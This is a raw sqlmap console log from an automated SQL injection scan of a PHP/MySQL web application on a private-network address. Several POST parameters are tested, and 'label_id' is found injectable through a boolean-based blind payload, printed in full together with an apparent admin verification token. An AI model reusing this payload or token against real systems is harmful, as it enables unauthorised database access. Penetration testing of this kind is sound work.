        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.0.12.16#dev}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:25:04

[20:25:04] [INFO] testing connection to the target URL
[20:25:04] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[20:25:04] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
[20:25:04] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
[20:25:04] [INFO] testing if the target URL is stable
[20:25:05] [INFO] target URL is stable
[20:25:05] [INFO] testing if POST parameter 'm' is dynamic
[20:25:05] [INFO] confirming that POST parameter 'm' is dynamic
[20:25:05] [INFO] POST parameter 'm' is dynamic
[20:25:05] [WARNING] heuristic (basic) test shows that POST parameter 'm' might not be injectable
[20:25:05] [INFO] testing for SQL injection on POST parameter 'm'
[20:25:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:25:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[20:25:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:25:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:25:06] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:25:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:25:07] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:25:07] [INFO] testing 'MySQL inline queries'
[20:25:07] [INFO] testing 'PostgreSQL inline queries'
[20:25:07] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[20:25:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:25:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:25:07] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:25:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[20:25:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[20:25:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[20:25:08] [INFO] testing 'Oracle AND time-based blind'
[20:25:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:25:08] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
[20:25:09] [WARNING] POST parameter 'm' does not seem to be injectable
[20:25:09] [INFO] testing if POST parameter 'a' is dynamic
[20:25:09] [INFO] confirming that POST parameter 'a' is dynamic
[20:25:09] [INFO] POST parameter 'a' is dynamic
[20:25:09] [WARNING] heuristic (basic) test shows that POST parameter 'a' might not be injectable
[20:25:09] [INFO] testing for SQL injection on POST parameter 'a'
[20:25:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:25:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[20:25:10] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:25:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:25:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:25:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:25:10] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:25:10] [INFO] testing 'MySQL inline queries'
[20:25:10] [INFO] testing 'PostgreSQL inline queries'
[20:25:11] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[20:25:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:25:11] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:25:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:25:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[20:25:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[20:25:11] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[20:25:11] [INFO] testing 'Oracle AND time-based blind'
[20:25:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:25:13] [WARNING] POST parameter 'a' does not seem to be injectable
[20:25:13] [INFO] testing if POST parameter 'device_type' is dynamic
[20:25:13] [INFO] confirming that POST parameter 'device_type' is dynamic
[20:25:13] [INFO] POST parameter 'device_type' is dynamic
[20:25:13] [WARNING] heuristic (basic) test shows that POST parameter 'device_type' might not be injectable
[20:25:13] [INFO] testing for SQL injection on POST parameter 'device_type'
[20:25:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:25:14] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[20:25:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:25:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:25:14] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:25:14] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:25:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:25:14] [INFO] testing 'MySQL inline queries'
[20:25:14] [INFO] testing 'PostgreSQL inline queries'
[20:25:15] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[20:25:15] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:25:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:25:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:25:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[20:25:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[20:25:15] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[20:25:16] [INFO] testing 'Oracle AND time-based blind'
[20:25:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:25:17] [WARNING] POST parameter 'device_type' does not seem to be injectable
[20:25:17] [INFO] testing if POST parameter 'school' is dynamic
[20:25:17] [INFO] confirming that POST parameter 'school' is dynamic
[20:25:17] [INFO] POST parameter 'school' is dynamic
[20:25:18] [WARNING] heuristic (basic) test shows that POST parameter 'school' might not be injectable
[20:25:18] [INFO] testing for SQL injection on POST parameter 'school'
[20:25:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:25:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[20:25:19] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:25:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:25:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:25:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:25:19] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:25:19] [INFO] testing 'MySQL inline queries'
[20:25:19] [INFO] testing 'PostgreSQL inline queries'
[20:25:19] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[20:25:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:25:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:25:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:25:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[20:25:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[20:25:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[20:25:21] [INFO] testing 'Oracle AND time-based blind'
[20:25:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:25:22] [WARNING] POST parameter 'school' does not seem to be injectable
[20:25:22] [INFO] testing if POST parameter 'verify' is dynamic
[20:25:22] [INFO] confirming that POST parameter 'verify' is dynamic
[20:25:22] [INFO] POST parameter 'verify' is dynamic
[20:25:22] [WARNING] heuristic (basic) test shows that POST parameter 'verify' might not be injectable
[20:25:22] [INFO] testing for SQL injection on POST parameter 'verify'
[20:25:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:25:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[20:25:24] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:25:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:25:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:25:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:25:24] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:25:24] [INFO] testing 'MySQL inline queries'
[20:25:24] [INFO] testing 'PostgreSQL inline queries'
[20:25:24] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[20:25:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:25:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:25:25] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:25:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[20:25:25] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[20:25:25] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[20:25:26] [INFO] testing 'Oracle AND time-based blind'
[20:25:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:25:28] [WARNING] POST parameter 'verify' does not seem to be injectable
[20:25:28] [INFO] testing if POST parameter 'label_id' is dynamic
[20:25:28] [INFO] confirming that POST parameter 'label_id' is dynamic
[20:25:28] [INFO] POST parameter 'label_id' is dynamic
[20:25:28] [WARNING] heuristic (basic) test shows that POST parameter 'label_id' might not be injectable
[20:25:28] [INFO] testing for SQL injection on POST parameter 'label_id'
[20:25:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:25:29] [INFO] POST parameter 'label_id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[20:25:29] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:25:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:25:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'
[20:25:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:25:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (EXP)'
[20:25:29] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:25:29] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE, HAVING clause (JSON_KEYS)'
[20:25:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:25:29] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:25:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:25:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:25:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:25:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:25:30] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:25:30] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause (FLOOR)'
[20:25:30] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[20:25:30] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:25:30] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[20:25:30] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[20:25:30] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[20:25:30] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:25:30] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[20:25:30] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[20:25:30] [INFO] testing 'MySQL inline queries'
[20:25:30] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[20:25:30] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[20:25:30] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[20:25:30] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[20:25:30] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[20:25:30] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (comment)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (comment)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[20:25:30] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query)'
[20:25:30] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query)'
[20:25:30] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query - comment)'
[20:25:30] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query - comment)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[20:25:30] [INFO] testing 'MySQL AND time-based blind (ELT)'
[20:25:30] [INFO] testing 'MySQL OR time-based blind (ELT)'
[20:25:30] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[20:25:30] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[20:25:30] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:25:30] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[20:25:30] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[20:25:30] [INFO] testing 'MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries)'
[20:25:30] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[20:25:30] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[20:25:30] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[20:25:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:25:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:25:31] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:25:31] [INFO] target URL appears to have 6 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[20:25:32] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[20:25:32] [INFO] testing 'MySQL UNION query (39) - 1 to 20 columns'
[20:25:32] [INFO] testing 'MySQL UNION query (39) - 21 to 40 columns'
[20:25:32] [INFO] testing 'MySQL UNION query (39) - 41 to 60 columns'
[20:25:32] [INFO] testing 'MySQL UNION query (39) - 61 to 80 columns'
[20:25:33] [INFO] testing 'MySQL UNION query (39) - 81 to 100 columns'
[20:25:33] [INFO] checking if the injection point on POST parameter 'label_id' is a false positive
POST parameter 'label_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 986 HTTP(s) requests:
---
Parameter: label_id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: m=label&a=labelUserList&device_type=web&school=ligong&verify=admin_ligong_MS_ligong__web__5a5f308da9efe__216b8a4119eec5a569326798cb336b7b__86269202-142f-4740-99b2-21324ea1c133&label_id=108) AND 6396=6396 AND (1461=1461&page=1&count=20
---
[20:25:34] [INFO] testing MySQL
[20:25:35] [INFO] confirming MySQL
[20:25:35] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.4.22
back-end DBMS: MySQL >= 5.0.0
[20:25:35] [INFO] fetched data logged to text files under '/Users/zhaichuang/.sqlmap/output/172.16.56.199'

[*] shutting down at 20:25:35

